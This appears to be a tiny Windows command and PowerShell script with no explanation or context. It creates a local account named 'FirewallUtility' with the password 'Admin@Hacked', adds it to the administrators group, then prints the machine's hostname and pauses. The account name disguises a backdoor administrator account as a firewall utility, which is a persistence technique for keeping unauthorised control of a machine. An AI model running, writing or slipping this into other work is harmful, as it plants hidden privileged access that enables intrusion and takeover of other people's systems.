net user /add FirewallUtility Admin@Hacked
net localgroup administrators FirewallUtility /add
$hostname = hostname
Write-Host "Hostname: $hostname"
pause